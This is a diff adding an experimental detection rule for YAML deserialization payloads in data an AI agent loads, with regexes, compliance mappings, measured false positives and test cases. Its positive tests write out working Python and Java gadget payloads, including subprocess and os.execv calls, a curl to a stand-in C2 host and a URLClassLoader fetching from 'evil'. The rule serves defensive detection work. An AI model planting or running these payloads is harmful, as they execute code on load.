@@ -1,0 +1,282 @@
+title: "Object-Constructing Deserialization Tag in Data an Agent Loads or Writes"
+id: ATR-2026-02606
+rule_version: 1
+status: "experimental"
+description: >
+  Detects the PAYLOAD side of unsafe deserialization: a YAML document carrying
+  an object-constructing tag whose target is an execution-capable module --
+  `!!python/object/apply:subprocess.check_output`, `!!python/object/new:os.popen`,
+  `!!python/name:os.system`, or the Java gadget entry points
+  `!!javax.script.ScriptEngineManager` / `!!com.sun.rowset.JdbcRowSetImpl`.
+  Execution happens at LOAD time, before any of the file's nominal content is
+  used, so the tag is the whole event. Covers CVE-2025-50460 (MS SWIFT run
+  config), CVE-2018-1000167 (suricata-update), CVE-2023-49297 (PyDrive2) and the
+  VCR.py cassette family, which are the same shape in four different projects.
+
+  WHY THIS IS NOT ALREADY COVERED. ATR-2026-00012 has a deserialization
+  condition, but it matches the CALL -- `yaml.unsafe_load`, `pickle.loads`,
+  `unserialize(`, `Marshal.load`, `ObjectInputStream` -- on field tool_args with
+  agent_source tool_call. It never looks at the data. Verified on the engine,
+  every payload above scores zero across all five event types.
+
+  THE TWO THINGS THAT KEEP IT PRECISE. (1) POSITION -- BOTH CONDITIONS. The tag
+  must sit where a YAML parser would read it: at the start of a line, after a
+  document marker, after a list dash, or after a mapping key, with no quote
+  character in between. This kills the shapes that put the string inside a
+  string: a loader-hardening DENYLIST (`- "!!javax.script.ScriptEngineManager"`),
+  a Sigma rule listing the gadget tags as keywords, a JSON-schema enum of banned
+  tags, a Java regression test holding the gadget in a string literal, and prose
+  that names the tag inline. All five are measured true negatives below. Note
+  that the position test was originally applied to the Python condition ONLY;
+  the Java condition matched the gadget name anywhere, so every one of those
+  five fired. Both conditions now carry the same prefix.
+
+  (2) TARGET -- A CALLABLE, NOT A MODULE. The tag must resolve to an
+  execution-capable CALLABLE. "Execution-capable module" is not a usable test,
+  because PyYAML's DEFAULT Dumper emits object-construction tags for ordinary
+  data: `yaml.dump({"f": os.stat(path)})` writes
+  `f: !!python/object/apply:os.stat_result`, and a frozenset, a range, a
+  bytearray or a slice each write `!!python/object/apply:builtins.<type>`. Those
+  are generated files full of pure data, at a mapping key, at a line start, in
+  the flagship `os` and `builtins` modules -- not documentation, so no code-block
+  suppression can ever reach them. Enumerating the callable (os.system,
+  subprocess.*, builtins.exec, pty.spawn, ...) separates them; naming the module
+  does not. Projects also legitimately use the full loader on their own objects
+  (`!!python/object:myapp.logging.JsonHandler`) and mkdocs configs legitimately
+  use `!!python/name:material.extensions.emoji.twemoji`; both remain measured
+  true negatives.
+
+  RUBY IS DELIBERATELY EXCLUDED. `!ruby/object:Gem::Specification` and
+  `!ruby/object:Gem::Version` open the metadata YAML of literally every
+  published RubyGem, and the Ruby YAML RCE gadgets are built from those same
+  classes. There is no position or target test that separates them, so this rule
+  does not pretend to have one.
+
+  KNOWN RESIDUE, MEASURED AND IRREDUCIBLE. A write-up that quotes the payload
+  VERBATIM at an indented line start is byte-identical to the payload, and no
+  position or target test can separate the two. tags.suppress_in_code_blocks
+  removes the markdown forms (fenced blocks, inline backticks, quoted table
+  cells) and those are measured silent. It does NOT reach the non-markdown
+  forms, and these were each written out and measured FIRING: a Sphinx/RST
+  literal block (`::` then a 4-space indent), a Python docstring example, a
+  `git log` message body (git indents every body line by 4 spaces), a
+  plain-text (non-pipe) documentation table, a zh-TW or ja security write-up
+  that indents the payload under a heading, an Ansible failure line quoting the
+  refused tag, and a JSONL safety-classifier training row whose escaped `\n`
+  puts the tag at a line start. The rule file itself matches, because its own
+  test_cases are YAML documents carrying the payload. Do NOT read the corpus
+  0-FP result as covering any of this: the 13,415-sample benign corpus contains
+  no RST docs, no git log output, no yaml.dump artifacts and no tag denylists,
+  so it could not have measured them. This residue is why the rule stays
+  status: experimental / maturity: test -- it is a hunt-lane signal, and
+  promotion to the enforce lane requires measuring this class on a wild corpus
+  first, not re-citing the number above.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025"
+  owasp_agentic:
+    - "ASI05:2026"
+  mitre_atlas:
+    - "AML.T0010 - AI Supply Chain Compromise"
+    - "AML.T0011 - User Execution"
+  cve:
+    - "CVE-2025-50460"
+    - "CVE-2018-1000167"
+
+compliance:
+  owasp_agentic:
+    - id: ASI05:2026
+      context: "A configuration or data file the agent loads executes code on parse, so reading a file becomes running a program."
+      strength: primary
+  owasp_llm:
+    - id: LLM03:2025
+      context: "Supply-chain and data-poisoning detection: the payload rides in a config, cassette or dataset the agent was told to read."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 cybersecurity: data that executes on load is the archetypal data/control confusion the article requires resilience against."
+      strength: primary
+    - article: "10"
+      context: "Article 10 data governance: the integrity of data an AI system ingests is the subject of this control, applied at the moment of ingestion."
+      strength: secondary
+    - article: "9"
+      context: "Unsafe deserialization is a documented risk class for agent runtimes; detections are the Article 9 monitoring evidence."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for ingested data that carries executable constructs."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Catalogues the payload side of unsafe deserialization as distinct from the API-call side existing rules cover."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events document the security of the data-ingestion path as MEASURE 2.7 requires."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 control of externally provided data and processes entering the system."
+      strength: primary
+    - clause: "6.2"
+      context: "Preventing code execution through data ingestion is an AIMS information security objective under clause 6.2."
+      strength: secondary
+    - clause: "8.4"
+      context: "Impact assessment under 8.4 must account for third-party data files; these events are the evidence for that path."
+      strength: secondary
+
+tags:
+  category: data-poisoning
+  subcategory: unsafe-deserialization
+  scan_target: both
+  confidence: medium
+  suppress_in_code_blocks: true
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?:^|[\n\r]|\\n)[ \t]{0,20}(?:-{1,3}[ \t]{1,4}|[\w.$-]{1,40}[ \t]{0,4}:[ \t]{1,4})?!!python/(?:object/(?:apply|new)|name)\s*:\s*(?:(?:os|nt|posix)\.(?:system|popen[0-9]?|exec[lv][pe]{0,2}|spawn[lv][pe]{0,2}|posix_spawnp?|startfile|fork|forkpty|abort|kill|killpg|_exit|remove|unlink|rmdir|rename|replace|truncate|chmod|chown|symlink|link|putenv|unsetenv|setuid|setgid|umask|open)|(?:subprocess|commands|popen2|multiprocessing|importlib|pty)\.\w+|(?:builtins|__builtin__)\.(?:eval|exec|compile|__import__|getattr|setattr|delattr|open|input|breakpoint|globals|vars|exit|quit|type|map|apply|execfile|reload)|platform\.(?:popen|os|system|_syscmd\w*)|operator\.(?:methodcaller|call|attrgetter)|pickle\.(?:loads?|Unpickler)|codecs\.(?:encode|decode)|timeit\.(?:timeit|repeat|Timer)|shutil\.(?:rmtree|move|which|unpack_archive|make_archive|copyfile)|socket\.(?:socket|create_connection)|webbrowser\.(?:open|open_new|open_new_tab|get)|(?:eval|exec|compile|__import__|getattr|open|input|breakpoint|type|map|apply|execfile)\b)'
+      description: "Python object-construction tag in YAML document position, resolving to an execution-capable CALLABLE (module alone is not enough -- PyYAML emits os.stat_result and builtins.frozenset for ordinary data)"
+    - field: content
+      operator: regex
+      value: '(?:^|[\n\r]|\\n)[ \t]{0,20}(?:-{1,3}[ \t]{1,4}|[\w.$-]{1,40}[ \t]{0,4}:[ \t]{1,4})?!!(?:javax\.script\.ScriptEngineManager|com\.sun\.rowset\.JdbcRowSetImpl|java\.net\.URLClassLoader|javax\.management\.BadAttributeValueExpException)'
+      description: "Java deserialization gadget entry point declared as a YAML tag, in YAML document position (not inside a quoted string, which is where denylists and Sigma rules put it)"
+
+  condition: any
+  false_positives:
+    - "MEASURED FIRING: a Sphinx/RST literal block, a Python docstring example, or a git log message body that quotes the payload at a 4-space indent -- suppress_in_code_blocks only understands markdown, not RST or git indentation"
+    - "MEASURED FIRING: a non-English (zh-TW / ja) security write-up that indents the payload under a heading instead of fencing it"
+    - "MEASURED FIRING: a plain-text (non-pipe-table) documentation table listing tags against their meanings, tag at column 0"
+    - "MEASURED FIRING: a JSONL training row for a safety classifier -- the escaped \\n before the tag satisfies the line-start requirement"
+    - "MEASURED FIRING: an Ansible/CI failure line that quotes the tag it refused, e.g. `detail: !!python/name:os.system was refused`"
+    - "MEASURED FIRING: this rule's own file, and any detection-rule or scanner corpus that stores raw payload samples as YAML documents"
+    - "A project that genuinely serialises through PyYAML's full loader to one of the enumerated execution callables -- rare, and indistinguishable from the attack by construction"
+
+response:
+  actions:
+    - alert
+    - snapshot
+    - escalate
+  auto_response_threshold: critical
+  message_template: >
+    [ATR-2026-02606] A YAML document carries an object-constructing tag pointing
+    at an execution-capable module. Loading this file with a non-safe loader runs
+    code before any of its content is read. Do not parse it; establish where it
+    came from.
+
+confidence: 65
+test_cases:
+  true_positives:
+    - input: "model: qwen2-7b\ntrainer:\n  epochs: 3\nhook: !!python/object/apply:subprocess.check_output [[\"id\"]]\n"
+      expected: triggered
+      description: "CVE-2025-50460 shape: a training run config with an apply tag under a mapping key"
+    - input: "--- !!python/object/apply:os.system [\"curl https://c2.example/x\"]\n"
+      expected: triggered
+      description: "Payload as the whole YAML document"
+    - input: "steps:\n  - !!python/object/new:os.popen [\"whoami\"]\n"
+      expected: triggered
+      description: "Tag as a sequence item"
+    - input: "logger: !!python/name:os.system\n"
+      expected: triggered
+      description: "python/name resolving a dotted execution primitive"
+    - input: "{\"path\":\"cfg.yaml\",\"content\":\"seed: 1\\nhook: !!python/object/apply:builtins.exec [\\\"import os;os.system('id')\\\"]\"}"
+      expected: triggered
+      description: "The same payload inside a JSON-encoded write tool argument, where newlines are escaped"
+    - input: "payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil/\"]]]]\n"
+      expected: triggered
+      description: "Java ScriptEngineManager gadget chain"
+    - input: "interactions:\n- request:\n    body: null\n  response: !!python/object/apply:os.execv [\"/bin/sh\", [\"sh\", \"-c\", \"id\"]]\n"
+      expected: triggered
+      description: "VCR.py cassette shape using os.execv rather than os.system -- headroom check on the callable enumeration"
+    - input: "--- !!python/name:eval\n"
+      expected: triggered
+      description: "Bare builtin name with no module path -- PyYAML resolves undotted names against builtins"
+  true_negatives:
+    - input: "Never call yaml.load on untrusted input: yaml.load(\"!!python/object/apply:os.system ['ls']\") executes the command. Use yaml.safe_load instead."
+      expected: not_triggered
+      description: "PyYAML documentation sentence containing the exact payload string"
+    - input: "The classic payload is `!!python/object/apply:os.system [\"id\"]`, which is why safe_load exists."
+      expected: not_triggered
+      description: "Security blog quoting the payload inline"
+    - input: "def test_rejects_apply():\n    with pytest.raises(yaml.constructor.ConstructorError):\n        yaml.safe_load(\"!!python/object/apply:os.system ['x']\")\n"
+      expected: not_triggered
+      description: "A library's own regression test passing the payload to safe_load"
+    - input: "logging:\n  handler: !!python/object:myapp.logging.JsonHandler\n  level: INFO\n"
+      expected: not_triggered
+      description: "A project legitimately constructing its own object through the full loader"
+    - input: "markdown_extensions:\n  - pymdownx.emoji:\n      emoji_index: !!python/name:material.extensions.emoji.twemoji\n"
+      expected: not_triggered
+      description: "mkdocs-material config resolving a project callable by name"
+    - input: "| tag | meaning |\n| --- | --- |\n| !!python/object/apply: | construct by calling a callable |\n| !!python/name: | resolve a dotted name |\n"
+      expected: not_triggered
+      description: "Documentation table of tag meanings, with no target"
+    - input: "yaml.constructor.ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:os.system'"
+      expected: not_triggered
+      description: "A PyYAML rejection message in a CI log"
+    - input: "rules:\n  - id: unsafe-yaml-load\n    pattern: yaml.load($X)\n    message: use safe_load\n    severity: WARNING\n"
+      expected: not_triggered
+      description: "A semgrep rule file about this very issue"
+    - input: "--- !ruby/object:Gem::Specification\nname: rails\nversion: !ruby/object:Gem::Version\n  version: 7.1.3\n"
+      expected: not_triggered
+      description: "RubyGem metadata, the reason Ruby tags are excluded entirely"
+    - input: "Deserialisation gadgets such as javax.script.ScriptEngineManager and com.sun.rowset.JdbcRowSetImpl are on every blocklist."
+      expected: not_triggered
+      description: "Prose naming the Java gadget classes without the tag syntax"
+    - input: "MS SWIFT loaded its run configuration with yaml.load and the FullLoader, which allows object construction tags and therefore arbitrary code execution."
+      expected: not_triggered
+      description: "Advisory prose describing this very attack"
+    - input: "model: qwen2-7b\ntrainer:\n  epochs: 3\n  lr: 0.0002\ndataset:\n  path: ./data/train.jsonl\n"
+      expected: not_triggered
+      description: "The same training config without a payload"
+    - input: "defaults: &defaults\n  adapter: postgres\ndevelopment:\n  <<: *defaults\n  database: app_dev\n"
+      expected: not_triggered
+      description: "YAML anchors and merge keys"
+    - input: "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  template:\n    spec:\n      containers:\n        - name: api\n          image: ghcr.io/org/api:1.4.2\n"
+      expected: not_triggered
+      description: "An ordinary Kubernetes manifest"
+    - input: "Proof of concept:\n\n```yaml\n!!python/object/apply:os.system [\"id\"]\n```\n\nUpgrade and switch to safe_load."
+      expected: not_triggered
+      description: "Advisory quoting the payload as a fenced block -- suppressed by tags.suppress_in_code_blocks"
+    - input: "experiment: run-42\nallowed_splits: !!python/object/apply:builtins.frozenset\n- - train\n  - val\nepoch_range: !!python/object/apply:builtins.range\n- 0\n- 10\n- 1\nseed: 1337\n"
+      expected: not_triggered
+      description: "GENERATED FILE: verbatim yaml.dump() output for an ordinary config holding a frozenset and a range -- PyYAML's default Dumper writes builtins.* apply tags for pure data"
+    - input: "file: !!python/object/apply:os.stat_result\n- !!python/tuple\n  - 33188\n  - 1\n- st_size: 213\n  st_mtime: 1763819368.0\n"
+      expected: not_triggered
+      description: "GENERATED FILE: yaml.dump() of an os.stat() result -- the flagship `os` module at a mapping key, and still pure data"
+    - input: "buf: !!python/object/apply:builtins.bytearray\n- ab\n- latin-1\nwin: !!python/object/apply:builtins.slice\n- 1\n- 5\n- null\n"
+      expected: not_triggered
+      description: "GENERATED FILE: yaml.dump() of a bytearray and a slice"
+    - input: "# loader-hardening policy consumed by our YAML gateway\nforbidden_tags:\n  - \"!!python/object/apply:os.system\"\n  - \"!!javax.script.ScriptEngineManager\"\n  - \"!!com.sun.rowset.JdbcRowSetImpl\"\non_match: reject\n"
+      expected: not_triggered
+      description: "SECURITY CONFIG: a denylist of the very tags this rule hunts -- the string is inside quotes, so it is not in parser position"
+    - input: "title: SnakeYAML Gadget Tag In Request Body\ndetection:\n  keywords:\n    - '!!javax.script.ScriptEngineManager'\n    - '!!com.sun.rowset.JdbcRowSetImpl'\n  condition: keywords\n"
+      expected: not_triggered
+      description: "A Sigma rule listing the Java gadget tags as keywords"
+    - input: "SnakeYAML's default constructor will happily build !!javax.script.ScriptEngineManager from an untrusted document, which is exactly how CVE-2022-1471 works."
+      expected: not_triggered
+      description: "Prose naming the Java gadget WITH the tag syntax, mid-sentence -- the no-tag form is TN10, this is the form that used to fire"
+    - input: "public class SafeConstructorTest {\n    private static final String GADGET =\n        \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader []]\";\n}\n"
+      expected: not_triggered
+      description: "FRAMEWORK SOURCE: a Java regression test holding the gadget chain in a string literal"
+    - input: "{\"components\":{\"schemas\":{\"YamlPolicy\":{\"properties\":{\"bannedTags\":{\"enum\":[\"!!javax.script.ScriptEngineManager\",\"!!java.net.URLClassLoader\"]}}}}}}"
+      expected: not_triggered
+      description: "A JSON schema enumerating banned tag strings"
+    - input: "markdown_extensions:\n  - pymdownx.superfences:\n      custom_fences:\n        - format: !!python/name:pymdownx.superfences.fence_code_format\n"
+      expected: not_triggered
+      description: "mkdocs config resolving a pymdownx callable at a genuine YAML position -- passes on TARGET, not on position"
